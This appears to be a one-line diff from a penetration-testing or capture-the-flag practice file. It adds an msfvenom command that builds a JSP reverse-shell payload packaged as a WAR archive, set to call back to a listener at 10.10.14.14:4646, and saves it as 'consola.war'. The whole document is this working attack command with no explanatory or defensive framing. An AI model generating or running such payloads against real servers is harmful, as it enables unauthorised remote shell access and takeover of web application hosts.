@@ -1,0 +1,1 @@
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=4646 -f war -o ~eltrompazo/Descargas/consola.war
